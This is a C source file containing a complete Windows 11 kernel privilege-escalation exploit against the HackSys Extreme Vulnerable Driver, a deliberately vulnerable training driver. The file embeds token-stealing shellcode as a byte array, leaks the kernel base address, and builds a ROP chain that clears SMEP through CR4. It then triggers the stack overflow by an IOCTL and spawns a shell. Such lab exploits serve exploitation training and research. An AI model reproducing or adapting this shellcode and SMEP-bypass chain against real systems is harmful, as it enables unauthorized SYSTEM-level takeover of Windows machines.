/*
HEVD TriggerBufferOverflowStack
OS Name	Microsoft Windows 11 Pro
Version	10.0.22631 Build 22631

ntoskrnl Version 10.0.22621.3593

cl /c /Zi /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /external:W3 /Gd /TP /FC /errorReport:prompt BoF_SMEP.c

based on: https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/
*/

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdbool.h>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)

BYTE sc[256] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
  0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

// Error func
void error_handler(const char* function) {
    printf("[-] Error from %s\n", function);
    long int errorCode = GetLastError();
    LPTSTR errorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&errorText,
        0,
        NULL
    );

    printf("[-] Error (%ld): %ls\n", errorCode, errorText);
    exit(-1);
}

// Gets kernel base addr
unsigned long long get_kernel_base_addr() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (unsigned long long)drivers[0];
}

int main() {

    // Handle to device
    HANDLE hDevice = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
        error_handler("Getting handle");

    unsigned long long kernel_base = get_kernel_base_addr();
    printf("[+] Kernel base: %llx\n", kernel_base);

    unsigned long long g_pop_rcx_ret =      0x000000000020d810 + kernel_base;
    unsigned long long g_mov_cr4_rcx_ret =  0x0000000000399047 + kernel_base;
    printf("[+] Gadget: pop rcx - %llx\n", g_pop_rcx_ret);
    printf("[+] Gadget: mov cr4, rcx - %llx\n", g_mov_cr4_rcx_ret);

    int index = 0;
    int bufSize = 2072 + 4 * 8;

    LPVOID uBuffer = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlFillMemory(uBuffer, bufSize, '\x41');
    RtlCopyMemory(shellcode, sc, 256);
    printf("[+] uBuffer: %llx\n", uBuffer);
    printf("[+] Shellcode: %llx\n", shellcode);

    unsigned long long* rop = (unsigned long long*)((unsigned long long)uBuffer + 2072);

    *(rop + index++) = g_pop_rcx_ret;
    *(rop + index++) = 0x370E78 ^ 1UL << 20;
    *(rop + index++) = g_mov_cr4_rcx_ret;
    *(rop + index++) = (unsigned long long)shellcode;

    DeviceIoControl(hDevice, 0x222003, (LPVOID)uBuffer, bufSize, NULL, 0, NULL, NULL);
    printf("[+] Calling device...\n");

    system("cmd");
    return 0;
}
